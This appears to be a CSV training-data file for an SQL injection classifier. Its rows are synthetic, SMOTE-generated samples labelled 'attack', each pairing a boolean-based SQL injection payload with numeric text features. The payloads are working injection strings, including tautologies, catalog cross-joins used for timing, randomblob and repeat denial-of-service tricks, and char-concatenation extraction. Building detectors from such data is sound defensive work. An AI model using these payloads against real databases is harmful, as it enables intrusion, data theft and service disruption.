id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000467,attack,boolean,-8665' or 6825  =  7840 and 'vbsy' like 'vbsy,nearest_attack_euclidean,R000029,1.1230205940646094,43.85229852899958,21.130746322498958,3.938006823315005,16.13922389674969,11.139223896749687,10.573850735500208,6.0,0.3673582657781805,0.2531368525776374,0.24243918580353035,0.13706569584065176,4.0,0.0,0.713074632249896,0.0,0.0,1.2869253677501042,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.2869253677501042,0.7130746322498958,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000468,attack,boolean,"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000306,1.2830760016575768,129.50699897027408,28.45581799459529,3.9295941338948386,73.36745398378586,8.0,35.68372699189293,12.455817994595288,0.5665390123291721,0.0618477694989049,0.27553853497722297,0.09607468319470003,0.2279089972976438,0.0,0.0,0.0,1.0,1.0,0.0,5.0,0.0,-1.1102230246251565e-16,2.0,2.0,0.2279089972976439,0.0,0.0,0.227908997297644,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000469,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000121,0.053960915416635724,74.66990750259315,23.083738437824145,3.619166854507026,21.0,13.0,28.558256252160955,12.111651250432192,0.2818438971932631,0.17447479350059145,0.38148835529334013,0.16219295401280537,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.111651250432192,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000470,attack,boolean,1'   )    )     )   and 7533  =  7533 and    (    (     (  'hoyw'  =  'hoyw,nearest_attack_euclidean,R000247,0.2776605246617662,77.90897170655893,17.264770307199534,2.847027636976329,14.885339215039672,9.505908122879813,41.01181624575963,12.505908122879813,0.1901598418008368,0.12160032161319125,0.5278268503632129,0.16041298622275904,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.252954061439906,0.0,0.1264770307199532,0.12647703071995342,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000471,attack,boolean,"1%""  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000098,1.2538549471016593,116.36823521804135,34.4880213834583,3.6495542248940103,31.511978616541693,15.0,50.88021383458305,18.97604276691661,0.2716028725047116,0.1291889286463875,0.43618113392473906,0.1630270649241618,2.0,1.0,2.0,1.0,0.0,1.0,0.0,9.97604276691661,1.0,-1.1102230246251565e-16,1.0,4.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.511978616541695,0.48802138345830504,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000472,attack,boolean,"-5830  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",nearest_attack_euclidean,R000287,2.021045490761129,365.5468983480121,31.0,3.3380030872586546,96.57639926578318,52.323499694076325,166.71759951052212,49.92939987763053,0.2639533412192661,0.143080740082066,0.4562931876881492,0.13667273101051874,0.0,0.0,1.464699938815264,0.0,0.0,2.464699938815264,0.0,35.0,0.0,-1.1102230246251565e-16,1.0,13.92939987763053,0.0,0.0,0.46469993881526406,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,2.0,0.0,0.46469993881526417,0.0,0.4646999388152641,0.5353000611847359,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,18.464699938815265
SMOTE_000473,attack,boolean,"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000096,0.3388342531271958,94.6630507649831,28.112316411672303,3.5880860079283465,32.0,13.0,38.55073435331079,11.112316411672303,0.3380757866728308,0.1373432883358375,0.40714654276089063,0.11743438223044106,0.0,0.0,0.22463282334460621,0.0,1.0,1.0,0.0,6.887683588327697,0.0,1.0,1.0,2.224632823344606,0.0,0.0,0.11231641167230316,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000474,attack,boolean,"1' where 1031  =  1031 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000084,0.6962643873811644,196.65842326301356,33.67078836849321,3.8025761264299853,57.0,32.987634894520355,76.0,30.670788368493213,0.2898492546384309,0.16771044359177373,0.38646567285124117,0.15597462891855415,0.6707883684932145,0.0,2.0,0.0,0.0,2.0,0.0,16.0,0.0,1.0,3.0,10.0,0.6707883684932145,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000475,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000121,0.6597874014320128,82.19104952025539,24.023881190031922,3.511335376178658,21.0,13.0,34.82587460021282,13.365174920042563,0.2600645284162489,0.16099232711482075,0.41640448618982323,0.16253865827910716,4.0,0.0,0.0,0.0,0.0,2.0,0.0,5.365174920042563,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000476,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000294,0.7458051349887662,161.70998695429915,35.02286459754335,4.2087312989249615,78.0,18.0,42.46570310368498,23.244283850614163,0.48250827161544413,0.11134806268048711,0.26240280806374744,0.14374085764032132,3.2442838506141634,0.0,1.5114322987716733,0.0,1.0,2.0,0.0,5.244283850614163,0.0,5.0,4.0,5.755716149385837,1.0,0.0,0.7557161493858366,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,2.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000477,attack,boolean,-5880'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'rwgl'  =  'rwgl,nearest_attack_euclidean,R000236,1.6468658140106414,369.5838707325611,31.322440402932127,3.2677632515261874,89.28976161172851,50.0,176.9063111354932,53.38779798533937,0.24195521814470675,0.1354044453189164,0.47824968966483616,0.1443906468715407,2.7102383882714935,1.289761611728506,1.0,0.0,0.0,1.6775595970678734,0.0,36.71023838827149,0.0,-1.1102230246251565e-16,0.0,12.677559597067873,0.6775595970678734,0.3224404029321266,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,17.0
SMOTE_000478,attack,boolean,"1%"" or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000123,0.8358477203412725,226.65399740303565,36.343516972727826,3.767619261919209,67.9364125393965,27.188276757573924,90.93641253939651,40.59289556666869,0.2991826623340877,0.12136073696538824,0.4009658412394605,0.17849075946106352,0.0,1.0,2.0,0.0,0.0,1.2188276757573924,0.0,20.905861621213038,0.7811723242426076,1.7811723242426076,3.7811723242426076,12.343516972727823,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,0.0,0.0,0.21882767575739237,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.562344648485215,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.781172324242608
SMOTE_000479,attack,boolean,"1%'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000071,1.0856801995711651,131.73586722258116,29.789311203763525,3.947012238001206,62.59643706792117,10.0,38.35011895089646,20.789311203763525,0.477111904240349,0.07626145001332947,0.28885714824787656,0.15776949749844488,1.0,0.0,2.0,0.0,1.0,1.0,0.0,5.789311203763527,1.0,5.0,4.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.5964370679211755,0.4035629320788245,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000480,attack,boolean,-7773' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,nearest_attack_euclidean,R000310,1.6604048433322038,140.45926755592885,35.952979787472074,4.212912367800024,57.3706944155482,18.0,45.1826135654365,19.90595957494415,0.413076686033815,0.13165219016087643,0.3144301280969297,0.14084099570837885,6.464734840604056,0.0,1.0,0.0,0.0,1.4882449468680183,0.0,5.952979787472074,0.0,-1.1102230246251565e-16,0.0,6.488244946868019,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,1.0,0.0,0.0,1.0,0.48824494686801845,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,6.488244946868019
SMOTE_000481,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000005,1.42634996255871,31.700778018186654,11.138700928672819,3.1082933775635233,15.43064953566359,2.5620770895138385,8.423376160841023,5.284675232168203,0.505963187027521,0.062489685110093604,0.2621507721047404,0.169396355757645,4.0,0.0,0.0,0.0,0.0,1.2846752321682042,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,1.2846752321682042,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.5693504643364085,0.7153247678317958,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2846752321682047
SMOTE_000482,attack,boolean,"1  )   as qeav where 8127  =  8127 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000190,4.190575331116686e-05,379.99973984439373,31.0,3.36318001449778,102.9998843752861,54.99995182303588,170.99992291685743,50.99998072921435,0.27105250379183066,0.14473681229545235,0.4500001132772811,0.1342105706354359,0.0,0.0,1.999990364607175,0.0,0.0,2.999990364607175,0.0,35.0,0.0,-1.1102230246251565e-16,1.0,14.99998072921435,0.0,0.0,0.9999903646071753,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,2.0,0.0,0.9999903646071752,0.0,0.9999903646071752,9.635392824836053e-06,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,18.999990364607175
SMOTE_000483,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'fwok' like 'fwok",nearest_attack_euclidean,R000286,1.3817766688241324,138.92189175315391,29.297555804622082,4.063609411581231,81.40488839075584,5.811370910014512,35.81296503851734,15.892667413866242,0.6115981636799596,0.03688970071796498,0.24205082613017304,0.10946130947190234,3.0,0.0,0.0,0.0,0.7837406992296532,0.0,0.0,6.027630210784855,0.0,0.43251860154069366,2.4325186015406937,1.6487779023110405,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.469446951953614e-18,0.21625930077034672,0.7837406992296534,0.0,0.0,0.7837406992296532,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6487779023110404,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2162593007703464
SMOTE_000484,attack,boolean,"1%'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000292,0.1161183014417165,167.1387827176671,30.0,3.695243604891267,70.13878271766711,8.0,65.0,24.0,0.4194313574212019,0.04788194990340604,0.38904084296517394,0.14364584971021807,4.0,0.0,0.0,0.0,1.0,2.0,0.0,10.0,2.0,-1.1102230246251565e-16,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000485,attack,boolean,"1%""  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000098,1.022090724890348,115.37596345420401,34.397814859473094,3.6680741430718644,31.60218514052691,15.0,49.97814859473092,18.795629718946184,0.27468702703174996,0.13028803339144437,0.432157744433743,0.16286719514306264,2.0,1.0,2.0,1.0,0.0,1.0,0.0,9.795629718946184,1.0,-1.1102230246251565e-16,1.0,4.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.6021851405269081,0.397814859473092,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000486,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'hfqz'  =  'hfqz",nearest_attack_euclidean,R000069,1.4488290304137887,142.22747193540314,31.532301893036927,3.848998739553984,60.03366057718161,10.338490534815374,53.2584151442954,18.596905679110776,0.4143609271103391,0.0764517781806985,0.3774785103877707,0.13170878432119165,4.0,0.0,0.0,0.0,1.0,2.0,0.0,8.0,0.0,0.46769810696307484,1.532301893036925,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.467698106963075,0.5323018930369251,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000487,attack,boolean,"1'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   'dpdz' like 'dpdz",nearest_attack_euclidean,R000034,0.07186801453793942,377.0268416347574,41.91421050585902,3.6871460907390943,119.0,35.0,166.3699996113213,56.65684202343607,0.315724451138892,0.09286013268790944,0.4411499841247779,0.15026543204842058,4.0,0.0,0.0,0.0,0.0,1.0,0.0,35.65684202343607,0.0,2.0,4.0,11.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,12.0
SMOTE_000488,attack,boolean,"1""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000135,0.8930492937222452,136.09206227616485,31.405860525268814,4.054122143649966,68.28034122562724,8.468620175089605,41.93724035017921,17.405860525268814,0.5016385320807328,0.0621938743707547,0.30850278064553727,0.12766481290297516,0.0,1.0,2.0,0.0,1.0,1.0,0.0,6.0,0.4686201750896051,-1.1102230246251565e-16,2.468620175089605,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000489,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000033,1.096502516465879,126.59472430464169,32.23242205562867,3.5852702912549885,34.38378897218567,15.0,55.67577944371335,21.535155888742672,0.2736657447567056,0.11954250243351237,0.43659079260212236,0.17020096020765973,6.0,0.0,0.0,1.0,0.0,2.0,0.0,9.53515588874267,2.0,-1.1102230246251565e-16,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.3837889721856675,0.6162110278143325,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000490,attack,boolean,-2223'   )    )    as mjwp where 8650  =  8650 or 7900  =  5838,nearest_attack_euclidean,R000284,0.8090255049069465,61.249146801579286,23.0,3.6430079978536525,13.0,20.0,22.499268687067957,5.749878114511326,0.21280076291935068,0.3273857891066934,0.366064173482817,0.09374927449113885,0.749878114511326,0.2501218854886741,1.0,0.0,0.0,2.0,0.0,1.7498781145113256,0.0,-1.1102230246251565e-16,0.0,3.0,0.749878114511326,0.250121885488674,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000491,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000156,0.5784422095181118,370.2767311669362,31.276731166936216,3.4254061862571037,96.0,58.0,165.0,51.276731166936216,0.25926592706326307,0.15663983093405479,0.4456133121399834,0.13848092986269872,0.27673116693621425,0.0,3.0,0.0,0.0,3.0,0.0,34.0,0.0,-1.1102230246251565e-16,1.0,16.0,0.27673116693621425,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,2.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,19.0
SMOTE_000492,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000206,0.3703804491443725,144.36092165255985,32.38959495428419,4.302675321582166,84.29086587199575,8.267513945141031,35.290865871995734,16.511675963427354,0.5859060253224027,0.056328150610857664,0.24330279423076667,0.11446302983597303,3.8779189908568386,0.0,0.0,0.0,1.0,1.0,0.0,3.755837981713676,0.1220810091431615,-1.1102230246251565e-16,2.8779189908568386,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.8779189908568383,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8779189908568386
SMOTE_000493,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000154,0.743764508673068,208.7472849457942,33.32181643631512,3.7636370476591408,61.06910138210931,35.0,81.35636712736977,31.321816436315117,0.2924101254539548,0.1677085081985225,0.3897620132496956,0.1501193530978271,0.0,0.32181643631511486,2.0,0.0,0.0,2.0,0.0,17.0,0.0,1.0,3.0,10.0,0.0,0.3218164363151148,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
